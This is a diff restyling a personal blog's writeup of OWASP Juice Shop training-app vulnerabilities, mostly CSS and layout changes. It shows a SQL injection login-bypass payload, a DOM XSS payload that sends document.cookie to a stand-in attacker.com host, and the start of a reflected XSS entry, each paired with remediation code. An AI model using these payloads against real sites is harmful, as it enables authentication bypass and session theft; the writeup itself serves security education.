@@ -4,374 +4,948 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>OWASP Juice Shop Writeup | Harshith Suresh</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;0,900;1,400;1,700&family=DM+Sans:ital,wght@0,300;0,400;0,500;1,300&family=DM+Mono:wght@300;400&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=JetBrains+Mono:wght@400;600&family=Syne:wght@700;800&display=swap" rel="stylesheet">
+
     <style>
-        * { box-sizing: border-box; }
-        body { font-family: 'Inter', sans-serif; background: #0a0f1e; color: #cbd5e1; scroll-behavior: smooth; }
-        .gradient-text { background: linear-gradient(90deg, #3b82f6, #2dd4bf); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .glass-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); backdrop-filter: blur(10px); }
-        .nav-link:hover { color: #60a5fa; transition: 0.3s; }
-        .mono { font-family: 'JetBrains Mono', monospace; }
+        :root {
+            --cream: #faf7f2;
+            --cream-mid: #f2ebe0;
+            --cream-dark: #e8ddd0;
+            --terracotta: #b4603a;
+            --terracotta-light: #d4856a;
+            --terracotta-pale: #f0e0d6;
+            --ink: #1a1614;
+            --ink-mid: #3d3530;
+            --ink-light: #7a6e68;
+            --ink-faint: #b0a49e;
+            --sage: #6b7c6a;
+            --sage-pale: #e8eddf;
+            --gold: #c4943a;
+            --rule: #d4c8be;
 
-        .tag { display: inline-flex; align-items: center; gap: 4px; padding: 3px 10px; border-radius: 9999px; font-size: 0.7rem; font-weight: 600; font-family: 'JetBrains Mono', monospace; letter-spacing: 0.03em; cursor: pointer; transition: all 0.2s; border: 1px solid transparent; }
-        .tag-xss { background: rgba(239,68,68,0.12); color: #f87171; border-color: rgba(239,68,68,0.25); }
-        .tag-injection { background: rgba(251,146,60,0.12); color: #fb923c; border-color: rgba(251,146,60,0.25); }
-        .tag-access { background: rgba(168,85,247,0.12); color: #c084fc; border-color: rgba(168,85,247,0.25); }
-        .tag-sqli { background: rgba(34,197,94,0.12); color: #4ade80; border-color: rgba(34,197,94,0.25); }
-        .tag-all { background: rgba(59,130,246,0.12); color: #60a5fa; border-color: rgba(59,130,246,0.25); }
-        .tag.active { background: rgba(59,130,246,0.25); border-color: #60a5fa; }
+            --red-fg: #9b3a2a;
+            --red-bg: #fdf0ec;
+            --red-border: #e8c4ba;
+            --orange-fg: #9a5020;
+            --orange-bg: #fdf3e8;
+            --orange-border: #e8d0b0;
+            --green-fg: #3a6640;
+            --green-bg: #eef5ee;
+            --green-border: #b8d8bc;
+            --purple-fg: #5a3a7a;
+            --purple-bg: #f3eef9;
+            --purple-border: #cbbde8;
+            --blue-fg: #2a4a8a;
+            --blue-bg: #eef2fa;
+            --blue-border: #b8c8e8;
+        }
 
-        .challenge-card { transition: all 0.3s ease; }
-        .challenge-card.hidden { display: none; }
-        .challenge-card:hover { transform: translateY(-2px); }
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+        html { scroll-behavior: smooth; }
 
-        pre { background: #0d1117; border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 1rem 1.25rem; overflow-x: auto; font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; line-height: 1.6; color: #e2e8f0; }
-        code { font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; background: rgba(255,255,255,0.07); padding: 2px 6px; border-radius: 4px; color: #7dd3fc; }
-        
-        .exploit-label { font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; font-weight: 600; letter-spacing: 0.1em; text-transform: uppercase; padding: 2px 8px; border-radius: 4px; }
-        .exploit-bg { background: rgba(239,68,68,0.15); color: #f87171; }
-        .fix-bg { background: rgba(34,197,94,0.15); color: #4ade80; }
+        body {
+            font-family: 'DM Sans', sans-serif;
+            background-color: var(--cream);
+            color: var(--ink);
+            line-height: 1.7;
+            font-weight: 300;
+        }
 
-        .dot { width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0; margin-top: 5px; }
-        .accordion-content { max-height: 0; overflow: hidden; transition: max-height 0.4s ease; }
-        .accordion-content.open { max-height: 3500px; }
-        .chevron { transition: transform 0.3s ease; }
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 0;
+            opacity: 0.03;
+            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)'/%3E%3C/svg%3E");
+            background-size: 200px 200px;
+        }
+
+        /* ─── NAV ─── */
+        nav {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            z-index: 100;
+            background: rgba(250, 247, 242, 0.92);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--rule);
+            padding: 0 2.5rem;
+        }
+
+        .nav-inner {
+            max-width: 1100px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 62px;
+        }
+
+        .nav-logo {
+            font-family: 'Playfair Display', serif;
+            font-size: 1.3rem;
+            font-style: italic;
+            color: var(--ink);
+            text-decoration: none;
+            letter-spacing: -0.01em;
+        }
+
+        .nav-logo span { color: var(--terracotta); }
+
+        .nav-links {
+            display: flex;
+            align-items: center;
+            gap: 2rem;
+            list-style: none;
+        }
+
+        .nav-links a {
+            font-family: 'DM Mono', monospace;
+            font-size: 0.72rem;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            color: var(--ink-light);
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .nav-links a:hover { color: var(--terracotta); }
+
+        .nav-resume {
+            font-family: 'DM Mono', monospace;
+            font-size: 0.72rem;
+            letter-spacing: 0.06em;
+            text-transform: uppercase;
+            color: var(--cream);
+            background: var(--ink);
+            padding: 8px 18px;
+            text-decoration: none;
+            border-radius: 2px;
+            transition: background 0.2s;
+        }
+
+        .nav-resume:hover { background: var(--terracotta); }
+
+        /* ─── HEADER ─── */
+        header {
+            padding-top: 120px;
+            padding-bottom: 4rem;
+            padding-left: 2rem;
+            padding-right: 2rem;
+            border-bottom: 1px solid var(--rule);
+            background: var(--cream-mid);
+        }
+
+        .header-inner {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .header-back {
+            font-family: 'DM Mono', monospace;
+            font-size: 0.7rem;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            color: var(--ink-faint);
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 2rem;
+            transition: color 0.2s;
+        }
+
+        .header-back:hover { color: var(--terracotta); }
+
+        .header-category {
+            font-family: 'DM Mono', monospace;
+            font-size: 0.68rem;
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+            color: var(--terracotta);
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .header-category::before {
+            content: '';
+            display: block;
+            width: 24px;
+            height: 1px;
+            background: var(--terracotta);
+        }
+
+        h1 {
+            font-family: 'Playfair Display', serif;
+            font-size: clamp(2.2rem, 5vw, 3.5rem);
+            font-weight: 900;
+            line-height: 1.05;
+            letter-spacing: -0.02em;
+            color: var(--ink);
+            margin-bottom: 1.25rem;
+        }
+
+        h1 em {
+            font-style: italic;
+            color: var(--terracotta);
+        }
+
+        .header-desc {
+            font-size: 1rem;
+            color: var(--ink-light);
+            max-width: 580px;
+            line-height: 1.75;
+            margin-bottom: 2rem;
+        }
+
+        .header-meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1.5rem;
+            align-items: center;
+        }
+
+        .meta-item {
+            font-family: 'DM Mono', monospace;
+            font-size: 0.68rem;
+            letter-spacing: 0.06em;
+            color: var(--ink-faint);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .meta-item i { font-size: 0.7rem; color: var(--terracotta-light); }
+
+        /* ─── FILTER BAR ─── */
+        .filter-bar {
+            position: sticky;
+            top: 62px;
+            z-index: 50;
+            background: rgba(250, 247, 242, 0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--rule);
+            padding: 0.85rem 2rem;
+        }
+
+        .filter-inner {
+            max-width: 800px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+            flex-wrap: wrap;
+        }
+
+        .filter-label {
+            font-family: 'DM Mono', monospace;
+            font-size: 0.62rem;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            color: var(--ink-faint);
+            margin-right: 4px;
+        }
+
+        .filter-tag {
+            font-family: 'DM Mono', monospace;
+            font-size: 0.65rem;
+            letter-spacing: 0.06em;
+            padding: 4px 12px;
+            border-radius: 2px;
+            border: 1px solid var(--rule);
+            background: transparent;
+            color: var(--ink-light);
+            cursor: pointer;
+            transition: all 0.15s;
+        }
+
+        .filter-tag:hover { border-color: var(--ink-light); color: var(--ink); }
+
+        .filter-tag.active-all { background: var(--ink); color: var(--cream); border-color: var(--ink); }
+        .filter-tag.active-xss { background: var(--red-bg); color: var(--red-fg); border-color: var(--red-border); }
+        .filter-tag.active-injection { background: var(--orange-bg); color: var(--orange-fg); border-color: var(--orange-border); }
+        .filter-tag.active-sqli { background: var(--green-bg); color: var(--green-fg); border-color: var(--green-border); }
+        .filter-tag.active-access { background: var(--purple-bg); color: var(--purple-fg); border-color: var(--purple-border); }
+
+        /* ─── MAIN CONTENT ─── */
+        main {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 3rem 2rem 6rem;
+            display: flex;
+            flex-direction: column;
+            gap: 1px;
+        }
+
+        /* ─── VULN CARDS ─── */
+        .vuln-card {
+            background: var(--cream);
+            border: 1px solid var(--cream-dark);
+            border-radius: 4px;
+            overflow: hidden;
+            transition: border-color 0.2s;
+        }
+
+        .vuln-card:hover { border-color: var(--rule); }
+        .vuln-card.hidden { display: none; }
+
+        .vuln-header {
+            padding: 1.75rem 2rem;
+            cursor: pointer;
+            display: flex;
+            align-items: flex-start;
+            justify-content: space-between;
+            gap: 1rem;
+        }
+
+        .vuln-header-left { display: flex; align-items: flex-start; gap: 1rem; flex: 1; }
+
+        .vuln-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            flex-shrink: 0;
+            margin-top: 7px;
+        }
+
+        .dot-red { background: var(--red-fg); }
+        .dot-orange { background: var(--orange-fg); }
+        .dot-green { background: var(--green-fg); }
+        .dot-purple { background: var(--purple-fg); }
+
+        .vuln-tags { display: flex; flex-wrap: wrap; gap: 5px; margin-bottom: 0.5rem; }
+
+        .vtag {
+            font-family: 'DM Mono', monospace;
+            font-size: 0.6rem;
+            letter-spacing: 0.07em;
+            padding: 2px 8px;
+            border-radius: 2px;
+            border: 1px solid;
+        }
+
+        .vtag-xss { color: var(--red-fg); background: var(--red-bg); border-color: var(--red-border); }
+        .vtag-injection { color: var(--orange-fg); background: var(--orange-bg); border-color: var(--orange-border); }
+        .vtag-sqli { color: var(--green-fg); background: var(--green-bg); border-color: var(--green-border); }
+        .vtag-access { color: var(--purple-fg); background: var(--purple-bg); border-color: var(--purple-border); }
+
+        .vuln-title {
+            font-family: 'Playfair Display', serif;
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--ink);
+            line-height: 1.3;
+        }
+
+        .vuln-subtitle {
+            font-size: 0.83rem;
+            color: var(--ink-faint);
+            margin-top: 2px;
+        }
+
+        .chevron {
+            color: var(--ink-faint);
+            font-size: 0.75rem;
+            flex-shrink: 0;
+            margin-top: 4px;
+            transition: transform 0.3s;
+        }
+
         .chevron.open { transform: rotate(180deg); }
-        .scanlines { background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px); pointer-events: none; }
+
+        /* ─── ACCORDION BODY ─── */
+        .vuln-body {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.4s ease;
+        }
+
+        .vuln-body.open { max-height: 4000px; }
+
+        .vuln-body-inner {
+            padding: 0 2rem 2rem 2rem;
+            border-top: 1px solid var(--cream-dark);
+            padding-top: 1.75rem;
+            display: flex;
+            flex-direction: column;
+            gap: 1.25rem;
+        }
+
+        .vuln-prose {
+            font-size: 0.92rem;
+            color: var(--ink-light);
+            line-height: 1.75;
+        }
+
+        code {
+            font-family: 'DM Mono', monospace;
+            font-size: 0.8rem;
+            background: var(--cream-mid);
+            border: 1px solid var(--cream-dark);
+            padding: 1px 6px;
+            border-radius: 2px;
+            color: var(--terracotta);
+        }
+
+        /* ─── PAYLOAD / FIX BLOCKS ─── */
+        .block-label {
+            font-family: 'DM Mono', monospace;
+            font-size: 0.6rem;
+            font-weight: 400;
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+            padding: 3px 10px;
+            border-radius: 2px;
+            display: inline-block;
+            margin-bottom: 0.5rem;
+        }
+
+        .label-exploit { background: var(--red-bg); color: var(--red-fg); border: 1px solid var(--red-border); }
+        .label-fix { background: var(--green-bg); color: var(--green-fg); border: 1px solid var(--green-border); }
+
+        pre {
+            background: var(--ink);
+            border-radius: 3px;
+            padding: 1.1rem 1.25rem;
+            overflow-x: auto;
+            font-family: 'DM Mono', monospace;
+            font-size: 0.76rem;
+            line-height: 1.7;
+            color: rgba(250,247,242,0.85);
+        }
+
+        pre code {
+            background: transparent;
+            border: none;
+            padding: 0;
+            color: inherit;
+            font-size: inherit;
+        }
+
+        /* ─── CALLOUT / INFO BOXES ─── */
+        .callout {
+            border-radius: 3px;
+            padding: 1rem 1.25rem;
+            font-size: 0.87rem;
+            line-height: 1.65;
+        }
+
+        .callout-red { background: var(--red-bg); border: 1px solid var(--red-border); color: var(--red-fg); }
+        .callout-neutral { background: var(--cream-mid); border: 1px solid var(--cream-dark); color: var(--ink-light); }
+        .callout-blue { background: var(--blue-bg); border: 1px solid var(--blue-border); color: var(--blue-fg); }
+
+        .callout-label {
+            font-family: 'DM Mono', monospace;
+            font-size: 0.6rem;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            font-weight: 400;
+            opacity: 0.7;
+            display: block;
+            margin-bottom: 0.4rem;
+        }
+
+        .callout strong { font-weight: 500; }
+
+        /* ─── COMPARISON GRID ─── */
+        .compare-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+
+        .compare-box {
+            background: var(--cream-mid);
+            border: 1px solid var(--cream-dark);
+            border-radius: 3px;
+            padding: 1rem;
+        }
+
+        .compare-box-label {
+            font-family: 'DM Mono', monospace;
+            font-size: 0.6rem;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            color: var(--ink-faint);
+            margin-bottom: 0.5rem;
+            display: block;
+        }
+
+        .compare-box p { font-size: 0.85rem; color: var(--ink-light); line-height: 1.55; }
+
+        /* ─── TABLE ─── */
+        .table-wrap {
+            background: var(--cream-mid);
+            border: 1px solid var(--cream-dark);
+            border-radius: 3px;
+            overflow: hidden;
+        }
+
+        .table-title {
+            font-family: 'DM Mono', monospace;
+            font-size: 0.62rem;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            color: var(--ink-faint);
+            padding: 0.75rem 1rem;
+            border-bottom: 1px solid var(--cream-dark);
+        }
+
+        table { width: 100%; border-collapse: collapse; }
+
+        th {
+            font-family: 'DM Mono', monospace;
+            font-size: 0.65rem;
+            letter-spacing: 0.06em;
+            color: var(--ink-faint);
+            text-align: left;
+            padding: 0.6rem 1rem;
+            border-bottom: 1px solid var(--cream-dark);
+            background: var(--cream-mid);
+        }
+
+        td {
+            font-family: 'DM Mono', monospace;
+            font-size: 0.72rem;
+            color: var(--ink-light);
+            padding: 0.6rem 1rem;
+            border-bottom: 1px solid var(--cream-dark);
+        }
+
+        tr:last-child td { border-bottom: none; }
+
+        td.val-no { color: var(--red-fg); }
+        td.val-yes { color: var(--green-fg); }
+        td.val-code { color: var(--terracotta); }
+
+        /* ─── FOOTER ─── */
+        footer {
+            background: var(--ink);
+            color: var(--ink-faint);
+            padding: 2.5rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid rgba(255,255,255,0.05);
+        }
+
+        footer .footer-logo {
+            font-family: 'Playfair Display', serif;
+            font-style: italic;
+            font-size: 1.1rem;
+            color: rgba(250,247,242,0.4);
+        }
+
+        footer p {
+            font-family: 'DM Mono', monospace;
+            font-size: 0.65rem;
+            letter-spacing: 0.06em;
+            text-transform: uppercase;
+        }
+
+        @media (max-width: 640px) {
+            .compare-grid { grid-template-columns: 1fr; }
+            nav { padding: 0 1rem; }
+            header { padding-left: 1rem; padding-right: 1rem; }
+            .filter-bar { padding: 0.85rem 1rem; }
+            main { padding: 2rem 1rem 4rem; }
+            footer { flex-direction: column; gap: 1rem; text-align: center; }
+        }
     </style>
 </head>
 <body>
 
-    <nav class="fixed top-0 w-full z-50 glass-card py-4">
-        <div class="max-w-6xl mx-auto px-6 flex justify-between items-center">
-            <a href="index.html" class="text-xl font-bold gradient-text">HS.</a>
-            <div class="hidden md:flex space-x-8 text-sm font-medium items-center">
-                <a href="index.html#experience" class="nav-link text-slate-300">Experience</a>
-                <a href="index.html#projects" class="nav-link text-slate-300">Projects</a>
-                <a href="index.html#skills" class="nav-link text-slate-300">Skills</a>
-                <a href="index.html#blog" class="nav-link text-slate-300">Blog</a>
-                <a href="Harshith Suresh 2026 Final Resume .pdf" download class="bg-blue-600 px-4 py-2 rounded-lg text-white hover:bg-blue-500 transition shadow-lg shadow-blue-900/20">
-                    <i class="fas fa-file-download mr-2"></i>Resume
-                </a>
-            </div>
+    <nav>
+        <div class="nav-inner">
+            <a href="index.html" class="nav-logo">H<span>.</span>S</a>
+            <ul class="nav-links">
+                <li><a href="index.html#experience">Experience</a></li>
+                <li><a href="index.html#projects">Projects</a></li>
+                <li><a href="index.html#skills">Skills</a></li>
+                <li><a href="index.html#blog">Writing</a></li>
+                <li><a href="Harshith Suresh 2026 Final Resume .pdf" download class="nav-resume"><i class="fas fa-file-download" style="margin-right:6px;font-size:0.65rem;"></i>Resume</a></li>
+            </ul>
         </div>
     </nav>
 
-    <header class="pt-36 pb-16 px-6 relative overflow-hidden">
-        <div class="absolute inset-0 scanlines"></div>
-        <div class="max-w-4xl mx-auto relative">
-            <h1 class="text-4xl md:text-6xl font-black text-white mb-4 leading-tight" style="font-family: 'Syne', sans-serif;">
-                OWASP Juice Shop<br><span class="gradient-text"></span>
-            </h1>
-            <p class="text-slate-400 text-lg max-w-2xl leading-relaxed mb-8">
-                Documentation of 8 distinct vulnerabilities, exploring the mechanics of exploitation and code-level remediation.
-            </p>
-            <div class="flex flex-wrap items-center gap-6 text-sm text-slate-500 mono">
-                <span class="flex items-center gap-2">Harshith Suresh</span>
-                <span class="flex items-center gap-2">March 2026</span>
-                <span class="flex items-center gap-2">8 Vulnerabilities</span>
+    <header>
+        <div class="header-inner">
+            <a href="index.html#blog" class="header-back"><i class="fas fa-arrow-left"></i> Back to Writing</a>
+            <p class="header-category">Security Writeup</p>
+            <h1>OWASP Juice Shop<br><em>Vulnerability Writeup</em></h1>
+            <p class="header-desc">Documentation of 8 distinct vulnerabilities — exploring the mechanics of exploitation and code-level remediation across injection, XSS, and access control categories.</p>
+            <div class="header-meta">
+                <span class="meta-item"><i class="fas fa-user"></i> Harshith Suresh</span>
+                <span class="meta-item"><i class="fas fa-calendar"></i> March 2026</span>
+                <span class="meta-item"><i class="fas fa-bug"></i> 8 Vulnerabilities</span>
             </div>
         </div>
     </header>
 
-    <div class="sticky top-16 z-40 bg-[#0a0f1e]/90 backdrop-blur border-b border-slate-800/60 py-3 px-6">
-        <div class="max-w-4xl mx-auto flex items-center gap-3 flex-wrap">
-            <span class="text-xs text-slate-500 mono mr-1">FILTER:</span>
-            <button class="tag tag-all active" onclick="filterCards('all', this)">All 8</button>
-            <button class="tag tag-xss" onclick="filterCards('xss', this)">XSS</button>
-            <button class="tag tag-injection" onclick="filterCards('injection', this)">Injection</button>
-            <button class="tag tag-sqli" onclick="filterCards('sqli', this)">SQLi</button>
-            <button class="tag tag-access" onclick="filterCards('access', this)">Access Control</button>
+    <div class="filter-bar">
+        <div class="filter-inner">
+            <span class="filter-label">Filter</span>
+            <button class="filter-tag active-all" onclick="filterCards('all', this)">All 8</button>
+            <button class="filter-tag" onclick="filterCards('xss', this)">XSS</button>
+            <button class="filter-tag" onclick="filterCards('injection', this)">Injection</button>
+            <button class="filter-tag" onclick="filterCards('sqli', this)">SQLi</button>
+            <button class="filter-tag" onclick="filterCards('access', this)">Access Control</button>
         </div>
     </div>
 
-    <main class="max-w-4xl mx-auto px-6 py-12 space-y-6">
+    <main>
 
-        <div class="challenge-card glass-card rounded-2xl overflow-hidden" data-tags="sqli injection">
-            <div class="p-6 cursor-pointer flex items-start justify-between gap-4" onclick="toggleAccordion(this)">
-                <div class="flex items-start gap-4">
-                    <div class="dot bg-green-400 mt-1"></div>
+        <!-- 1. SQL Injection Login -->
+        <div class="vuln-card" data-tags="sqli injection">
+            <div class="vuln-header" onclick="toggleAccordion(this)">
+                <div class="vuln-header-left">
+                    <div class="vuln-dot dot-green"></div>
                     <div>
-                        <div class="flex flex-wrap items-center gap-2 mb-2">
-                            <span class="tag tag-sqli">SQLi</span>
-                            <span class="tag tag-injection">Injection</span>
+                        <div class="vuln-tags">
+                            <span class="vtag vtag-sqli">SQLi</span>
+                            <span class="vtag vtag-injection">Injection</span>
                         </div>
-                        <h2 class="text-xl font-bold text-white">Admin Login via SQL Injection</h2>
-                        <p class="text-slate-500 text-sm mt-1">Authentication bypass via crafted email payload</p>
+                        <h2 class="vuln-title">Admin Login via SQL Injection</h2>
+                        <p class="vuln-subtitle">Authentication bypass via crafted email payload</p>
                     </div>
                 </div>
-                <i class="fas fa-chevron-down chevron text-slate-500 mt-1 flex-shrink-0"></i>
+                <i class="fas fa-chevron-down chevron"></i>
             </div>
-            <div class="accordion-content">
-                <div class="px-6 pb-6 space-y-5">
-                    <p class="text-slate-400 leading-relaxed">The login endpoint passes the user-supplied email directly into a SQL query without sanitization. By injecting SQL syntax, the password check can be completely bypassed as the single quote closes the email string and <code>--</code> terminates the remainder of the query.</p>
-                    
-                    <div class="exploit-label exploit-bg mb-2">Payload</div>
-                    <pre>{"email":"admin' OR TRUE --","password":"admin"}</pre>
+            <div class="vuln-body">
+                <div class="vuln-body-inner">
+                    <p class="vuln-prose">The login endpoint passes the user-supplied email directly into a SQL query without sanitization. By injecting SQL syntax, the password check is completely bypassed — the single quote closes the email string and <code>--</code> terminates the remainder of the query.</p>
 
-                    <div class="bg-red-500/5 border border-red-500/20 rounded-xl p-4">
-                        <p class="text-xs mono text-red-400 mb-2 font-bold">SQL LEAKAGE</p>
-                        <pre style="font-size:0.72rem;">"sql": "SELECT * FROM Users WHERE email = 'admin OR '1=1 --' AND password = '...'</pre>
-                        <p class="text-slate-500 text-xs mt-2">The server exposed the full SQL query in the error response, facilitating the attack.</p>
+                    <div>
+                        <span class="block-label label-exploit">Payload</span>
+                        <pre>{"email":"admin' OR TRUE --","password":"admin"}</pre>
                     </div>
 
-                    <div class="exploit-label fix-bg mb-2">Solution</div>
-                    <pre>// Safe — parameterized query
+                    <div class="callout callout-red">
+                        <span class="callout-label">SQL Leakage in Error Response</span>
+                        <code style="background:transparent;border:none;padding:0;font-size:0.75rem;color:inherit;">SELECT * FROM Users WHERE email = 'admin OR '1=1 --' AND password = '...'</code>
+                        <p style="margin-top:0.5rem;font-size:0.83rem;">The server exposed the full SQL query in the error response, directly facilitating the attack.</p>
+                    </div>
+
+                    <div>
+                        <span class="block-label label-fix">Solution</span>
+                        <pre>// Parameterized query — input is data, never syntax
 db.query('SELECT * FROM Users WHERE email = ?', [email])
 
-// Also — never expose SQL errors to the client
+// Never expose SQL errors to the client
 res.status(500).json({ error: 'Authentication failed' })</pre>
-                    <div class="bg-slate-800/40 rounded-xl p-4 text-sm text-slate-400">
-                        <strong class="text-white">Key Lesson:</strong> Parameterized queries treat user input as pure data, never as syntax. The <code>'--</code> becomes a literal string to match, not a terminator.
+                    </div>
+
+                    <div class="callout callout-neutral">
+                        <strong>Key lesson:</strong> Parameterized queries treat user input as pure data. The <code>'--</code> becomes a literal string to match, not a SQL terminator.
                     </div>
                 </div>
             </div>
         </div>
 
-        <div class="challenge-card glass-card rounded-2xl overflow-hidden" data-tags="xss">
-            <div class="p-6 cursor-pointer flex items-start justify-between gap-4" onclick="toggleAccordion(this)">
-                <div class="flex items-start gap-4">
-                    <div class="dot bg-red-400 mt-1"></div>
+        <!-- 2. DOM XSS -->
+        <div class="vuln-card" data-tags="xss">
+            <div class="vuln-header" onclick="toggleAccordion(this)">
+                <div class="vuln-header-left">
+                    <div class="vuln-dot dot-red"></div>
                     <div>
-                        <div class="flex flex-wrap items-center gap-2 mb-2">
-                            <span class="tag tag-xss">XSS</span>
-                        </div>
-                        <h2 class="text-xl font-bold text-white">DOM-Based XSS via Search Parameter</h2>
-                        <p class="text-slate-500 text-sm mt-1">Inject HTML via location.hash — never touches the server</p>
+                        <div class="vuln-tags"><span class="vtag vtag-xss">XSS</span></div>
+                        <h2 class="vuln-title">DOM-Based XSS via Search Parameter</h2>
+                        <p class="vuln-subtitle">Inject HTML via location.hash — never touches the server</p>
                     </div>
                 </div>
-                <i class="fas fa-chevron-down chevron text-slate-500 mt-1 flex-shrink-0"></i>
+                <i class="fas fa-chevron-down chevron"></i>
             </div>
-            <div class="accordion-content">
-                <div class="px-6 pb-6 space-y-5">
-                    <p class="text-slate-400 leading-relaxed">Angular uses <code>location.hash</code> for routing. The search component renders the <code>q</code> parameter directly into the DOM using <code>innerHTML</code>. Since everything after <code>#</code> stays in the browser, this attack remains invisible to server-side WAFs.</p>
-                    
-                    <div class="exploit-label exploit-bg mb-2">Payload — Cookie Exfiltration</div>
-                    <pre>http://localhost:3000/#/search?q=&lt;img src=x onerror="new Image().src='https://attacker.com/steal?c='%2Bdocument.cookie"&gt;</pre>
-                    
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-3">
-                        <div class="bg-slate-800/40 rounded-xl p-4">
-                            <p class="text-xs mono text-slate-500 mb-2">WHY img onerror?</p>
-                            <p class="text-slate-400 text-sm">Not blocked by CORS. Bypasses certain URI filters that block <code>javascript:</code>.</p>
+            <div class="vuln-body">
+                <div class="vuln-body-inner">
+                    <p class="vuln-prose">Angular uses <code>location.hash</code> for routing. The search component renders the <code>q</code> parameter directly into the DOM using <code>innerHTML</code>. Since everything after <code>#</code> stays in the browser, this attack remains invisible to server-side WAFs.</p>
+
+                    <div>
+                        <span class="block-label label-exploit">Payload — Cookie Exfiltration</span>
+                        <pre>http://localhost:3000/#/search?q=&lt;img src=x onerror="new Image().src='https://attacker.com/steal?c='%2Bdocument.cookie"&gt;</pre>
+                    </div>
+
+                    <div class="compare-grid">
+                        <div class="compare-box">
+                            <span class="compare-box-label">Why img onerror?</span>
+                            <p>Not blocked by CORS. Bypasses filters that target <code>javascript:</code> URIs.</p>
                         </div>
-                        <div class="bg-slate-800/40 rounded-xl p-4">
-                            <p class="text-xs mono text-slate-500 mb-2">WHY hash (#)?</p>
-                            <p class="text-slate-400 text-sm">Browser does not send fragments to the server. Purely client-side execution.</p>
+                        <div class="compare-box">
+                            <span class="compare-box-label">Why the hash (#)?</span>
+                            <p>Browsers never send fragments to the server — purely client-side execution.</p>
                         </div>
                     </div>
 
-                    <div class="exploit-label fix-bg mb-2">Solution</div>
-                    <pre>// Use textContent — treats input as plain text
+                    <div>
+                        <span class="block-label label-fix">Solution</span>
+                        <pre>// textContent treats input as plain text, not markup
 element.textContent = location.hash.slice(1)
 
-// Angular: use {{ }} not [innerHTML]
+// In Angular, use interpolation not innerHTML binding
 &lt;p&gt;{{ searchQuery }}&lt;/p&gt;</pre>
+                    </div>
                 </div>
             </div>
         </div>
 
-        <div class="challenge-card glass-card rounded-2xl overflow-hidden" data-tags="xss">
-            <div class="p-6 cursor-pointer flex items-start justify-between gap-4" onclick="toggleAccordion(this)">
-                <div class="flex items-start gap-4">
-                    <div class="dot bg-orange-400 mt-1"></div>
+        <!-- 3. Reflected XSS -->
+        <div class="vuln-card" data-tags="xss">
+            <div class="vuln-header" onclick="toggleAccordion(this)">
+                <div class="vuln-header-left">
+                    <div class="vuln-dot dot-orange"></div>
                     <div>
-                        <div class="flex flex-wrap items-center gap-2 mb-2">
-                            <span class="tag tag-xss">XSS</span>
-                        </div>
-                        <h2 class="text-xl font-bold text-white">Reflected XSS via Order Tracking</h2>
-                        <p class="text-slate-500 text-sm mt-1">Server echoes payload in the HTML response</p>
+                        <div class="vuln-tags"><span class="vtag vtag-xss">XSS</span></div>
+                        <h2 class="vuln-title">Reflected XSS via Order Tracking</h2>
+                        <p class="vuln-subtitle">Server echoes payload back in the HTML response</p>
                     </div>
                 </div>
-                <i class="fas fa-chevron-down chevron text-slate-500 mt-1 flex-shrink-0"></i>
+                <i class="fas fa-chevron-down chevron"></i>
             </div>
-            <div class="accordion-content">
-                <div class="px-6 pb-6 space-y-5">
-                    <p class="text-slate-400 leading-relaxed">This payload makes a full HTTP round trip. The server processes the <code>id</code> parameter and injects it back into the page markup. In this SPA, a reload is required to force the server call.</p>
-                    
